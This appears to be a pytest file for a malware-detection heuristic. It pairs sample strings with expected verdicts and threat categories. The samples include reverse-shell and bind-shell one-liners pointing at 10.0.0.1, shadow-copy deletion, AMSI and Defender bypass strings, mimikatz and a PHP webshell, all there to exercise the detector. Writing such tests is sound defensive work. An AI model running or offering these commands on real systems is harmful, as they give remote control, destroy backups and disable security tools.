"""Expanded heuristic coverage for representative suspicious indicators."""

import os
import sys

import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from core.llm_analyzer import THREAT_PATTERNS, _fallback_analysis


@pytest.mark.parametrize(
    ("name", "content", "want_malicious", "want_category"),
    [
        ("Bash /dev/tcp", "bash -i >& /dev/tcp/10.0.0.1/4242", True, "reverse_shell"),
        ("Netcat exec", "nc -e /bin/sh 10.0.0.1", True, "reverse_shell"),
        ("Python dup2", "import socket,os;os.dup2(s.fileno(),0)", True, "reverse_shell"),
        ("PowerShell TCP", "New-Object System.Net.Sockets.TCPClient", True, "reverse_shell"),
        ("PHP fsockopen", "php -r '$sock=fsockopen(\"10.0.0.1\",4242);'", True, "reverse_shell"),
        ("Ruby TCPSocket", 'TCPSocket.new("10.0.0.1", 4242)', True, "reverse_shell"),
        ("Perl socket", "perl -e 'use Socket; $i=\"10.0.0.1\";'", True, "reverse_shell"),
        ("Socat exec", "socat exec:bash tcp:10.0.0.1:4242", False, None),
        ("Go net.Dial", 'net.Dial("tcp","10.0.0.1:4242")', True, "reverse_shell"),
        ("Java Runtime.exec", 'Runtime.getRuntime().exec("/bin/sh")', True, None),
        ("Node child_process", "child_process.exec('/bin/sh')", True, "reverse_shell"),
        ("Lua os.execute", 'os.execute("/bin/sh")', True, "reverse_shell"),
        ("Dart Socket.connect", 'Socket.connect("10.0.0.1", 4242)', True, "reverse_shell"),
        ("Awk inet/tcp", "awk /inet/tcp/4242/", True, "reverse_shell"),
        ("OpenSSL s_client", "openssl s_client -connect 10.0.0.1:4242", True, "reverse_shell"),
        ("Telnet pipe", "telnet 10.0.0.1 4242 | /bin/sh", True, "reverse_shell"),
        ("Xterm display", "xterm -display 10.0.0.1:1", True, "reverse_shell"),
        ("HoaxShell", "hoaxshell payload", True, "reverse_shell"),
        ("BusyBox nc", "busybox nc 10.0.0.1 4242 -e /bin/sh", True, "reverse_shell"),
        ("WSASocket", "WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP)", True, "reverse_shell"),
        ("CreateProcess cmd", 'CreateProcess(NULL,"cmd.exe")', True, "reverse_shell"),
        (
            "VirtualAlloc injection",
            "VirtualAllocEx(h,0,s,MEM_COMMIT,PAGE_EXECUTE_READWRITE)",
            True,
            "process_injection",
        ),
        ("WriteProcessMemory", "WriteProcessMemory(hProc,addr,buf)", True, "process_injection"),
        ("CreateRemoteThread", "CreateRemoteThread(hProc,NULL,0)", True, "process_injection"),
        ("Netcat bind", "nc -lvp 4444 -e /bin/sh", True, "bind_shell"),
        ("Socat bind", "socat TCP-LISTEN:4444 EXEC:/bin/sh", True, "bind_shell"),
        ("Ransomware note", "YOUR FILES HAVE BEEN ENCRYPTED", True, "ransomware"),
        ("Shadow copy deletion", "vssadmin delete shadows /all", True, "ransomware"),
        ("XMRig miner", "xmrig --algo=cryptonight", True, "cryptominer"),
        ("Stratum pool", "stratum+tcp://pool.minexmr.com", True, "cryptominer"),
        ("Cobalt Strike", "cobalt strike beacon", True, "rat"),
        ("AsyncRAT", "asyncrat client", True, "rat"),
        ("AMSI bypass", "AmsiUtils amsiInitFailed", True, "evasion"),
        ("Defender disabled", "Set-MpPreference -DisableRealtimeMonitoring", True, "evasion"),
        ("Mimikatz", "mimikatz sekurlsa", True, "credential_theft"),
        ("Webshell eval", "eval($_GET['cmd'])", True, "webshell"),
        ("Normal text", "Hello world normal file", False, None),
        ("HTML page", "<html><body>Hello</body></html>", False, None),
        ("CSS file", "body { color: red; margin: 0; }", False, None),
    ],
)
def test_expanded_heuristic_patterns(name, content, want_malicious, want_category):
    result = _fallback_analysis("test.txt", "modified", content)
    categories = {finding["category"] for finding in result.get("findings", [])}

    assert result["is_malicious"] is want_malicious, name
    if want_category:
        assert want_category in categories, name


def test_threat_pattern_catalog_is_populated():
    assert len(THREAT_PATTERNS) >= 100
